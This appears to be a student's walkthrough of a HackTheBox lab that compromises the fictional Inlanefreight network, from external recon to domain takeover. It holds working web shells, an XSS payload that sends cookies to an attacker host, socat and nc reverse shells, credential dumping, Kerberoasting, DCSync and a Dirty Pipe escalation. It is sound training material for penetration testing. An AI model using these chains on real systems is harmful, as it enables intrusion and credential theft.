
Disclipine matters: nobody catching me. I am the best of best in my mind!


# SCOPE 


## External Testing 

```bash
10.129.x.x ("external" facing target host)
*.inlanefreight.local (all subdomains)
```

## Internal Testing

```bash
172.16.8.0/23
172.16.9.0/23 
INLANEFREIGHT.LOCAL (Active Directory domain)
```



External Testing:

Target IP : Spinup > vhosts : inlanefreight.local


# External Information Gathering (Page)

```bash
sudo nano scope (put IP)
```

## Quick TCP scan to find open ports


```bash
sudo nmap --open -oA inlanefreight_ept_tcp_1k -iL scope 

sudo nmap -sS --top-ports 5000 --open -T4 -v -oA scans/top5000 -iL scope

sudo nmap -sS -sV -sC --open -p- -T4 -v -oA scans/initial-full-svc-scripts -iL scope --reason --stats-every 10m
```

### Why this one?

- -sS → fast & stealthier SYN scan
- -sV -sC → gets versions + useful quick script results (banners, http titles, vulns, etc.)
- --open → clean output, only interesting ports
- -p- → all ports (critical on external — weird services hide on high ports)
- -T4 → aggressive but usually still acceptable speed/noise
- -v → see progress
- -oA → all output formats (you'll thank yourself later)
- --reason → helps understand firewall / filtering behavior
- --stats-every 10m → sanity during long scans

Run this → wait → review results → decide next steps (UDP, virtual hosts, targeted vuln scans, etc.).

## full port scan x performing additional enumeration including OS detection, version scanning, and script scanning.


```bash
sudo nmap --open -p- -A -oA inlanefreight_ept_tcp_all_svc -iL scope
```


## cut through the noise for a better clear view 


```bash
https://github.com/leonjza/awesome-nmap-grep
```

```bash
egrep -v "^#|Status: Up" inlanefreight_ept_tcp_all_svc.gnmap | cut -d ' ' -f4- | tr ',' '\n' | sed 's/^[ \t]*//' | awk -F '/' '{print $5}' | grep -v "^$" | sort | uniq -c | sort -k 1 -nr
```

**“Which services/programs appear most often on the open ports?”**

It counts every service name it finds (like http = web server, ssh = remote login, smtp = email, ftp = file transfer, etc.) and shows them sorted from **most common to least common**.


## DNS Is present lets try Zone Transfer to see if we can enumerate any valid subdomains


```bash
dig axfr inlanefreight.local @10.129.203.101
```

 if a DNS Zone Transfer is not possible, we could enumerate subdomains in many ways https://dnsdumpster.com/


 ## If DNS were not in play, we could also perform vhost enumeration using a tool such as ffuf

 To fuzz vhosts, we must first figure out what the response looks like for a non-existent vhost. We can choose anything we want here; we just want to provoke a response, so we should choose something that very likely does not exist.


```bash
 curl -s -I http://10.129.203.101 -H "HOST: defnotvalid.inlanefreight.local" | grep "Content-Length:"
```

locate namelist.txt

 
```bash
cp /usr/share/dnsrecon/namelist.txt .
```

```bash
ffuf -w namelist.txt:FUZZ -u http://10.129.203.101/ -H 'Host:FUZZ.inlanefreight.local' -fs 15157
```

 ## Add Vhosts and subdomains in /etc/hosts

```bash
 sudo tee -a /etc/hosts > /dev/null <<EOT
```

## inlanefreight hosts 

```bash
10.129.203.101 inlanefreight.local blog.inlanefreight.local careers.inlanefreight.local dev.inlanefreight.local gitlab.inlanefreight.local ir.inlanefreight.local status.inlanefreight.local support.inlanefreight.local tracking.inlanefreight.local vpn.inlanefreight.local
```



----------------------------------------------------------------------------------------------------------------------														
# Service Enumeration & Exploitation 


## FTP : check anonymous login and try to upload anything

```bash
ftp 10.129.203.101
```

```bash
anonymous:anonymous
get flag.txt
echo 'test'>> upload.txt

ftp> put upload.txt 
```

Also look for any public exploits releated to service version eg: FTPd 3.0.3  just GoOgle


## SSH
start with a banner grab: It attempts to open a TCP connection to port 22 on the IP address 10.129.203.101 (almost always the SSH port), and shows you whether the connection succeeds or fails.


```bash
nc -nv 10.129.203.101 22
```
 
host is running OpenSSH version 8.2 [also search on google releated to svc]


We could try some password brute-forcing, but we don't have a list of valid usernames, so it would be a shot in the dark. It's also doubtful that we'd be able to brute-force the root password. We can try a few combos such as admin:admin, root:toor, admin:Welcome, admin:Pass123


```bash
ssh admin@10.129.203.101 (dead)
```

## Email Services : enumerate system users

https://academy.hackthebox.com/module/116/section/1173
https://mxtoolbox.com/


```bash
sudo nmap -sV -sC -p25 10.129.203.101
```

Next, we'll check for any misconfigurations related to authentication. We can try to use the VRFY command to enumerate system users.


```bash
telnet 10.129.203.101 25 
```
VRFY root

VRFY manoj {valid user 252 and invalid 550}

We can see that the VRFY command is not disabled, and we can use this to enumerate valid users. This could potentially be leveraged to gather a list of users we could use to mount a password brute-forcing attack against the FTP and SSH services and perhaps others. 


https://github.com/pentestmonkey/smtp-user-enum



## POP3 


```bash
telnet 10.129.203.101 110
user www-data
```


## smtp-open-relay
The `smtp-open-relay` script checks whether the target SMTP server will relay email from one external domain to another external domain.


```bash
nmap -p25 -Pn --script smtp-open-relay  10.129.203.101
```

## RPCBIND Port 111


```bash
rpcinfo 10.129.203.101
```

This port can be probed to fingerprint the operating system or potentially gather information about available services.

For more details: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rpcbind.html


----------------------------------------------------------------------------------------------------------------------	

# Web Enumeration & Exploitation


```bash
cat ilfreight_subdomains
```
inlanefreight.local 
blog.inlanefreight.local 
careers.inlanefreight.local 
dev.inlanefreight.local 
gitlab.inlanefreight.local 
ir.inlanefreight.local 
status.inlanefreight.local 
support.inlanefreight.local 
tracking.inlanefreight.local 
vpn.inlanefreight.local
monitoring.inlanefreight.local

## screenshot

```bash
eyewitness -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness
```


```bash
curl -s http://blog.inlanefreight.local | grep Drupal (found nothing)
```

## Career.inlanefreight.local

https://10minutemail.com/

http://careers.inlanefreight.local/register 

http://careers.inlanefreight.local/profile?id=4 (idor at id 4)


## dev.inlanefreight.local


```bash
gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
```
/uploads and /upload.php directory exposed


Intercept the request & send to repeater

OPTIONS > we see that various methods are allowed: GET,POST,PUT,TRACK,OPTIONS. 


Cycling thro mugh the various options, each gives us a server error until we try the TRACK method and see that the X-Custom-IP-Authorization: 127.0.0.1


``
Track /upload.php HTTP/1.1

X-Custom-IP-Authorization: 127.0.0.1 
``

 Response window in Repeater we can select show response in browser

```
 <?php system($_GET['cmd']); ?>
```
 Save the file as 5351bf7271abaa2267e03c9ef6393f13.php 

 upload and change the Content-Type: image/png

 boom uploaded


```bash
 curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=id


 curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=hostname%20-I


 172.18.0.3 (still in DMZ)
```


 ## ir.inlanefreight.local (wordpress) Local File Inclusion (LFI)


```bash
 sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local
```


https://www.exploit-db.com/exploits/50226


```bash
 curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

```bash
 wpscan -e u -t 500 --url http://ir.inlanefreight.local
```
 


we find several users:

ilfreightwp
tom
james
john


https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-100.txt



```bash
wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp
```


From here, we can browse to http://ir.inlanefreight.local/wp-login.php and log in using the credentials ilfreightwp:password1


Once logged in, we'll be directed to http://ir.inlanefreight.local/wp-admin/ where we can browse to http://ir.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty to edit the 404.php file for the inactive theme Twenty Twenty and add in a PHP web shell to get remote code execution. 


```
system($_GET[0]);
```
The code above should let us execute commands via the GET parameter `0`. We add this single line to the file just below the comments to avoid too much modification of the contents.

```shell-session
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```
The [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module from Metasploit can be used to upload a shell and execute it automatically.

```shell-session
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
```
```shell-session
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options 
```

Note: We can use the [waybackurls](https://github.com/tomnomnom/waybackurls) tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.


## status.inlanefreight.local


```bash
' union select null, database(), user(), @@version -- //
```

POST / HTTP/1.1
Host: status.inlanefreight.local
Content-Length: 14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://status.inlanefreight.local
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://status.inlanefreight.local/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=s4nm572fgeaheb3lj86ha43c3p
Connection: close

searchitem=*

-------------------------------------------------


copy as text file and import to SQLMAP

```bash
sqlmap -r sqli.txt --dbms=mysql 
sqlmap -r sqli.txt --dbms=mysql --dbs
sqlmap -r sqli.txt --dbms=mysql -D status --tables
```


## support.inlanefreight.local - xss


```bash
"><script src=http://10.10.14.15:9000/TESTING_THIS></script>
```

```bash
nc -lvnp 9000
```

```bash
listening on [any] 9000 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.101] 56202
GET /TESTING_THIS%3C/script HTTP/1.1
Host: 10.10.14.15:9000
Connection: keep-alive
User-Agent: HTBXSS/1.0
Accept: */*
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

```bash
index.php
```

```bash
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

```bash
script.js
```

new Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie



```bash
sudo php -S 0.0.0.0:9200
```


Finally, create a new ticket and submit the following in the message field:


```bash
"><script src=http://10.10.14.15:9200/script.js></script>
```
We get a callback on our web server with an admin's session cookie:


```bash
sudo php -S 0.0.0.0:9200
```

Click on the save button to save the cookie named session and click on Login in the top right. If all is working as expected, we will be redirected to http://support.inlanefreight.local/dashboard.php. 


## tracking.inlanefreight.local

```bash
`<script>document.write('TESTING THIS')</script>`
```
https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90
https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f


```bash
	<script>
	x=new XMLHttpRequest;
	x.onload=function(){  
	document.write(this.responseText)};
	x.open("GET","file:///etc/passwd");
	x.send();
	</script>
```

## gitlab.inlanefreight.local


reg and login and explore projects you will see the flag

## shopdev2.inlanefreight.local - xxe


```bash
<?xml version="1.0" encoding="UTF-8"?>
    <root>
     <subtotal>
      undefined
     </subtotal>
     <userid>
      1206
     </userid>
    </root>
```

### XXE 

```bash
    <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///etc/passwd">
]>
<root>
	<subtotal>
		undefined
	</subtotal>
	<userid>
		&xxetest;
	</userid>
</root>
```

## monitoring.inlanefreight.local


```bash
hydra -l admin -P ./passwords.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials!"
```
login: admin   password: 12qwaszx



login and connection_test intercept the request

GET /ping.php?ip=%127.0.0.1;id ()

```bash
curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'd"
curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'fconfig"
```

got internal network



 172.16.8.0/23
https://academy.hackthebox.com/module/109/section/1036


GET /ping.php?ip=127.0.0.1%0a'w'h'i'ch${IFS}socat (burp request)



-------------------


# Initial access

GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.15.3:8443${IFS}EXEC:bash (change IP Burp request)



## catch the shell

```bash
nc -nlvp 8443
```
upgrade to TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```bash
id

aureport --tty | less

srvadm:ILFreightnixadm!

su srvadm

/bin/bash -i
```

srvadm@dmz01:/var/www/html/monitoring$


remember the creds srvadm:ILFreightnixadm!


# Post-Exploitation Persistence

```bash
ssh srvadm@10.129.203.111

sudo -l
```
Go to GTFO beans > OPENSSL

srvadm@dmz01:~$ LFILE=/root/.ssh/id_rsa
srvadm@dmz01:~$ sudo /usr/bin/openssl enc -in $LFILE


## Establishing Persistence
```bash
chmod 600 dmz01_key 

ssh -i dmz01_key root@10.129.203.111
```

# Internal Information Gathering (Ligolo solving)

proxychains didn't work on my machine



## Setup ligolo attacker machine for Fist pivot
```bash
sudo su

ip tuntap add user root mode tun ligolo
ip link set ligolo up

./proxy -selfcert


scp -i dmz01_key agent root@targetIP:/tmp

root@dmz01 > cd /tmp

./agent -connect 192.168.1.5:11601 -ignore-cert
```

### session join
```bash
ligolo-ng » session

ligolo-ng » session 1

ligolo-ng » start
```

### open another terminal 
```bash
sudo ip route add 172.16.8.0/24 dev ligolo
```

### in ligolo session
```bash
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:8000 (Ligolo Session)
```

# Internal host discovery

```bash
root@dmz01:~# for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from

64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=0.472 ms
64 bytes from 172.16.8.20: icmp_seq=1 ttl=128 time=0.433 ms
64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 172.16.8.50: icmp_seq=1 ttl=128 time=0.642 ms
```



Our host discovery yields three additional hosts on this 172.16.8.0/23 subnet

172.16.8.3
172.16.8.20
172.16.8.50


## host enumeration

```bash
root@dmz01:/tmp# ./nmap --open -iL live_hosts 
```

### Active Directory Quick Hits - SMB NULL SESSION

We can quickly check against the Domain Controller for SMB NULL sessions. If we can dump the password policy and a user list, we could try a measured password spraying attack. If we know the password policy, we can time our attacks appropriately to avoid account lockout. If we can't find anything else, we could come back and use Kerbrute to enumerate valid usernames from various user lists and after enumerating (during a real pentest) potential usernames from the company's LinkedIn page. With this list in hand, we could try 1-2 spraying attacks and hope for a hit. If that still does not work, depending on the client and assessment type, we could ask them for the password policy to avoid locking out accounts. We could also try an ASREPRoasting attack if we have valid usernames

```bash
enum4linux -U -P 172.16.8.3
```

# 172.16.8.50 - Tomcat

 http://172.16.8.50:8080


We can then use the auxiliary/scanner/http/tomcat_mgr_login module to attempt to brute-force the login.
 msfconsole exploit failed



# 172.16.8.20 DotNetNuke (DNN)

http://172.16.8.20

showmount -e 172.16.8.20

## back to dmz01 

```bash
root@dmz01:/tmp# mkdir DEV01
root@dmz01:/tmp# mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
root@dmz01:/tmp# cd DEV01/
root@dmz01:/tmp/DEV01# ls
root@dmz01:/tmp/DEV01# cd DNN
cat web.config 
 ```

 you will get login passwd

```bash
root@dmz01:/tmp# tcpdump -i ens192 -s 65535 -w ilfreight_pcap
```

## Exploitation & Privilege Escalation - Attacking DNN

```bash
 Administrator:D0tn31Nuk3R0ck$$@123 login as admin

 Settings > SQL Console


EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE

Settings -> Security -> More -> More Security Settings 

remove all extension and add these


asp,aspx,SAVE,zip,ps1,exe and save the extension and adding them under Allowable File Extensions, and clicking the Save button

both field


https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/asp/newaspcmd.asp


then go there 

http://172.16.8.20/admin/file-management

upload PrintSpoofer64.exe
nc.exe (64bit)
newaspcmd.asp
```

### after upload to file management  

```bash
click on newaspcmd.asp

and ran this

c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"

back to root DMZ01

root@dmz01:/tmp# nc -lnvp 443

boom we are nt authority system

# DEV01

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
ACADEMY-AEN-DEV01
```

## dump sam database and local administrator password hash

```bash
cd c:\DotNetNuke\Portals\0

c:\DotNetNuke\Portals\0> reg save HKLM\SYSTEM SYSTEM.SAVE

c:\DotNetNuke\Portals\0> reg save HKLM\SECURITY SECURITY.SAVE

c:\DotNetNuke\Portals\0> reg save HKLM\SAM SAM.SAVE
```


Go to browser

```bash
http://172.16.8.20/admin/file-management

download the databases


secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE




crackmapexec smb 172.16.8.20 --local-auth -u administrator -H 3bb874a52ce7b0d64ee2a82bbf3fe1cc (hash)


SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV\administrator (Pwn3d!)


From the secretsdump output above, we notice a cleartext password, but it's not immediately apparent which user it's for. We could dump LSA again using CrackMapExec and confirm that the password is for the hporter user.

hporter:Gr8hambino!



c:\DotNetNuke\Portals\0> net user hporter /dom
```



# Lateral Movement

```bash
After pillaging the host DEV01, we found the following set of credentials by dumping LSA secrets:

hporter:Gr8hambino!


## upload sharphound


c:\DotNetNuke\Portals\0> SharpHound.exe -c All

## Bloodhound-GUI

Searching for our user hporter and selecting First Degree Object Control, we can see that the user has ForceChangePassword rights over the ssmalls user.

also we can see that all Domain Users have RDP access over the DEV01 host
```


## 3389 open
```bash

nmap -sT -p 3389 172.16.8.20

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```


pwd

```bash
xfreerdp /v:172.16.8.20 /u:hporter /p:Gr8hambino! /drive:home,"/home/htb-ac/80xsqv"
```

## use these commands in RDP session   172.16.8.20

```bash
copy \\TSCLIENT\home\PowerView.ps1 .

Import-Module .\PowerView.ps1

Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Str0ngpass86!' -AsPlainText -Force ) -Verbose

crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! (also try nxc if breaks)
```

## Share Hunting

download snaffer on your machine 

```bash
copy \\TSCLIENT\home\Snaffler.exe .

.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

so let's re-run our share enumeration as the ssmalls user.


```bash
crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'

cat 172.16.8.3.json 
```

we will see creds

```bash
proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares' 
smb: \IT\Private\> cd Development\
smb: \IT\Private\Development\> ls
smb: \IT\Private\Development\> get "SQL Express Backup.ps1" 

cat SQL\ Express\ Backup.ps1 
!qazXSW@
```

### sysvol

```bash
 smbclient -U ssmalls '//172.16.8.3/sysvol' 

 smb: \INLANEFREIGHT.LOCAL\> cd scripts
smb: \INLANEFREIGHT.LOCAL\scripts\> ls

smb: \INLANEFREIGHT.LOCAL\scripts\> get adum.vbs 
 cat adum.vbs 

 account:L337^p@$$w0rD
```

 ## Kerberoasting IN (rdp)

```bash
Import-Module .\PowerView.ps1
 Get-DomainUser * -SPN |Select samaccountname
Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
```

feel pain fuck it
```bash
sudo ntpdate -u 172.16.8.3 (fix kerberos clock issue)


GetUserSPNs.py INLANEFREIGHT.LOCAL/ssmalls:Str0ngpass86! -dc-ip 172.16.8.3 -request -outputfile ilfreight_spns

sudo gunzip /usr/share/wordlists/rockyou.txt

hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt
```

## Password Spraying in rdp session

```bash
copy \\TSCLIENT\home\DomainPasswordSpray.ps1 .

Import-Module .\DomainPasswordSpray.ps1

Invoke-DomainPasswordSpray -Password Welcome1
```

after spray we got 2 new names

kdenunez
mmertle  (username)

> Welcome1
 

# sysvol gpp_autologin


 We can search the SYSVOL share for Registry.xml files that may contain passwords for users configured with autologon via Group Policy.

 crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin



## description field

 we can search for passwords in user Description fields in AD, which is not overly common, but we still see it from time to time (I have even seen Domain and Enterprise Admin account passwords here!).

```bash
 Get-DomainUser * |select samaccountname,description | ?{$_.Description -ne $null}
```


 # MS01 172.16.8.50

```bash
  nmap -sT -p 5985 172.16.8.50


  evil-winrm -i 172.16.8.50 -u backupadm 

  passwd: !qazXSW@
```
```bash
  *Evil-WinRM* PS C:\Users\backupadm\desktop> cd c:\panther
```
  ### unattend.xml

```bash
  type unattend.xml

   ilfserveradm: Sys26Admin (usrname:passwd)


 xfreerdp /v:172.16.8.50 /u:ilfserveradm /p:Sys26Admin /drive:home,"/home/htb-ac/80xsqv"

 C:\Program Files (x86)\SysaxAutomation directory


 open powershell > notepad.exe

  net localgroup administrators ilfserveradm /add

  save as pwn.bat to  this location C:\Users\ilfserveradm\Documents\pwn.bat
```

  windows search menu
  
```bash
  C:\Program Files (x86)\SysaxAutomation\sysaxschedscp.exe
```
  Select Setup Scheduled/Triggered Tasks

  Add task (Triggered)

Update folder to monitor to be C:\Users\ilfserveradm\Documents


Check Run task if a file is added to the monitor folder or subfolder(s)

Choose Run any other Program and choose C:\Users\ilfserveradm\Documents\pwn.bat

Uncheck Login as the following user to run task

Click Finish and then Save


Finally, to trigger the task, create a new .txt file in the C:\Users\ilfserveradm\Documents directory.


eg : pwned

 We can check and see that the ilfserveradm user was added to the Administrators group.


```bash
C:\Users\ilfserveradm> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
ilfserveradm
INLANEFREIGHT\Domain Admins
The command completed successfully.



# Post-Exploitation/Pillaging on MS01

Next, we'll perform some post-exploitation on the MS01 host.

We do see a couple of interesting files in the root of the c:\ drive named 

budget_data.xlsx and Inlanefreight.kdbx 

that would be worth looking into and potentially reporting to the client if they are not in their intended location. Next, we can use Mimikatz, elevate to an NT AUTHORITY\SYSTEM token and dump LSA secrets.

c:\Users\ilfserveradm\Documents> mimikatz.exe
mimikatz # log

mimikatz # privilege::debug
mimikatz # lsadump::secrets
mimikatz # token::elevate
mimikatz # lsadump::secrets

---------------------------------
```

We find a set password but no associated username. This appears to be for an account configured with autologon, so we can query the Registry to find the username.

```bash
PS C:\Users\ilfserveradm> Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
```

Now we have a new credential pair: mssqladm:DBAilfreight1!.


--------------


Before we move on, let's check for any other credentials. We see Firefox installed, so we can grab the LaZagne tool to try to dump any credentials saved in the browser. No luck, but always worth a check.

```bash
c:\Users\ilfserveradm\Documents> lazagne.exe browsers -firefox
```

It's also worth running Inveigh once we have local admin on a host to see if we can obtain password hashes for any users.



### inveigh

```bash
PS C:\Users\ilfserveradm\Documents> Import-Module .\Inveigh.ps1
PS C:\Users\ilfserveradm\Documents> Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
```

# Active Directory Compromise

```bash
mssqladm:DBAilfreight1!
```
Digging into the BloodHound data we see that we have GenericWrite over the ttimmons user. Using this we can set a fake SPN on the ttimmons account and perform a targeted Kerberoasting attack.

## 172.16.8.20

Let's go back to the DEV01  machine where we had loaded PowerView. We can create a PSCredential object to be able to run commands as the mssqladm user without having to RDP again.


```bash
PS C:\DotNetNuke\Portals\0> $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force


PS C:\DotNetNuke\Portals\0> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)

PS C:\DotNetNuke\Portals\0> Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
```

## our machine
```bash
GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons -outputfile ttimmons_tgs 

DBAilfreight1!


hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt


 Import-Module .\PowerView.ps1
Repeat09

PS C:\htb> PS C:\DotNetNuke\Portals\0> $timpass = ConvertTo-SecureString 'Repeat09' -AsPlainText -Force
PS C:\DotNetNuke\Portals\0> $timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)


SERVER ADMINS group has the ability to perform the DCSync attack to obtain NTLM password hashes for any users in the domain.

PS C:\DotNetNuke\Portals\0> $group = Convert-NameToSid "Server Admins"
PS C:\DotNetNuke\Portals\0> Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
```

# Dcsync

```bash
secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm | grep Administrator

evil-winrm -i 172.16.8.3 -u administrator -H fd1f7e5564060258ea787ddbb6e6afa2

Get-Item "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa"

copy 'C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa' C:\Users\Public\ssmalls_key.txt

download "C:\Users\Public\ssmalls_key.txt"

*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> ipconfig /all

*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking>  1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}

chmod 600 ssmalls_key

ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25
```

# The Double Pivot - MGMT01

```bash
Attack host --> dmz01 --> MS01 --> DC01 --> MGMT01
```

on evilwinrm shell:

upload agent.exe
```bash
.\agent.exe -connect <first_pivot_IP>:11601 -ignore-cert (DMZ01 IP)

sudo ip tuntap add user root mode tun ligolo2
sudo ip link set ligolo2
```

on first pivot session dmz01:

```bash
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 -tcp


tunnel_start --tun ligolo2

sudo ip route add 172.16.8.0/23 dev ligolo2


ping 172.16.9.25


nmap -sT -p 22 172.16.9.25


ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25
```

# dirty pipe with exploit2c

https://www.cisa.gov/news-events/alerts/2022/03/10/dirty-pipe-privilege-escalation-vulnerability-linux

```bash
ssmallsadm@MGMT01:~$ uname -a

ssmallsadm@MGMT01:~$ gcc dirtypipe.c -o dirtypipe
ssmallsadm@MGMT01:~$ chmod +x dirtypipe
ssmallsadm@MGMT01:~$ ./dirtypipe 

ssmallsadm@MGMT01:~$ find / -perm -4000 2>/dev/null

./dirtypipe /usr/lib/openssh/ssh-keysign 
```

# id
```bash
uid=0(root) gid=0(root) groups=0(root),1001(ssmallsadm)
```
